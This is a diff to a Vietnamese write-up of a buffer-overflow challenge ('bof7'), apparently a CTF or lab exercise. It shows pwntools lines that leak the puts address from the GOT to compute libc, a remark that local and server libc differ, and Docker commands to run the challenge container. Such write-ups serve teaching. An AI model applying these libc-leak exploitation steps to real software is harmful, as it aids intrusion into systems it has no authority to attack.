@@ -134,4 +134,18 @@ leak_puts là địa chỉ của hàm puts leak được từ bảng GOT. Bằng
     p.sendafter(b'something \n', payload)
     libc_leak=u64(p.recv(6)+b'\0\0')
 
-Vì libc của local có thể khác với của server nên cần kiểm tra kí tự cuối của địa chỉ rồi truy 
+Vì libc của local có thể khác với của server nên khi tính toán offset sẽ bị sai. Cần đi tìm libc server:
+
+Build Docker:
+
+    sudo docker build -t bof7 .
+
+Run Docker tạo container:
+
+    sudo docker run -d -p 9993:9993 --name bof7_container bof7
+
+Xóa container:
+
+    sudo docker stop bof7_container && sudo docker rm bof7_container
+
+
